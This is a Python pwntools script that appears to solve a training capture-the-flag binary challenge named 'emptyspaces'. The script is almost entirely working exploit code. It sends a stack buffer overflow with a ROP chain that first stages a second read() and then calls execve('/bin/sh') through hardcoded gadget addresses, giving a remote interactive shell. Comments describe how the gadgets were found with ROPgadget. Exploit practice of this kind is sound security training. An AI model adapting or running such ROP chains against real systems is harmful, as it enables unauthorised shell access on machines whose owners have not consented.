from pwn import *
import time
context.terminal = ['tmux', 'splitw', '-h']

#r = process("./emptyspaces")
r = remote("bin.training.jinblack.it", 4006)

'''
gdb.attach(r, """
        b* 0x400c14
	c
""")
'''
# the idea is to call a new read because i don't have enough space (or maybe I have, but I did in this way, so i don't care)
# and then exploit again this buffer overflow vulnerability, but takes into account that we cannot write at the same position of before.
# the key idea was to exploit the pointer already present in the registers and write there

# to get the gadgets: 
# ROPgadget --binary emptyspaces | grep pop
# ROPgadget --binary emptyspaces | egrep 'mov rdi, rsi'
pop_rax_rdx_rbx = p64(0x481b76)
mov_rdi_rsi_ruinRax = p64(0x48f970)
pop_rsi = p64(0x410133)
pop_rdi = p64(0x400696)
pop_rdx = p64(0x4497c5)
pop_rdx_rsi = p64(0x44bd59)
syscall = p64(0x474dc5)


#payload = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"
#payload = b"A" * 72 + b"B"*8
payload = b"A" * 72 + pop_rdi + p64(0) + pop_rdx + p64(700)+ syscall 
r.send(payload)
time.sleep(0.1)

#payload2 = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"
#payload2 = b"A" * 112 + b"B"*8
bin_string = b"/bin/sh\x00"
payload2 = bin_string + b"A" * 104 + mov_rdi_rsi_ruinRax + pop_rax_rdx_rbx + p64(0x3b) + p64(0) + p64(0) + pop_rsi + p64(0) + syscall 
r.send(payload2)

r.interactive()

input("CIAO")
